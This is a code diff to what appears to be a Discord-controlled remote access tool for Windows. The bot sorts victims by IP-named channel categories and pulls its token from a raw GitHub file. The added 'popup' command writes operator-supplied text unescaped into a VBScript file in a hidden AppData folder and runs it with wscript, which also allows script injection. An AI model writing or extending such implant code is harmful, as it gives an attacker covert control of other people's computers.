@@ -28,6 +28,7 @@ import requests
 import sys
 import win32gui, win32con
 from PIL import Image
+from typing import Optional
 
 def get_open_windows():
     windows = {}
@@ -373,6 +374,28 @@ async def close_selected_window(interaction : Interaction):
                 self.add_item(WindowSelect())
 
         await interaction.response.send_message("Select a window to close:", view=WindowView())
+
+@client.slash_command(guild_ids=testServerId, description="Pops up a message on the client's screen.")
+async def popup(interaction : Interaction, window_title: Optional[str], message: str, repeat: Optional[int]):
+    category = interaction.channel.category
+    if str(category) == str(ip):
+        user_id = interaction.user.id
+        fmsg = f"""X=MsgBox("{str(message)}",0+16,"{str(window_title)}")"""
+
+        user_profile = os.environ['USERPROFILE']
+        target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
+
+        with open(os.path.join(target_path, "skibidi-mainmain", "popup", "popup.vbs"), "w") as po:
+            if repeat is None or repeat == 0:
+                repeat = 1
+            for i in range(repeat):
+                po.write(fmsg + "\n")
+            po.close()
+
+        subprocess.Popen(["wscript", os.path.join(target_path, "skibidi-mainmain", "popup", "popup.vbs")], shell=True)
+        
+        interaction.response.send_message(f"Popup window succesfully opened with message: {message}")
+
 
 r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/heads/main/tok")
 token = r.text
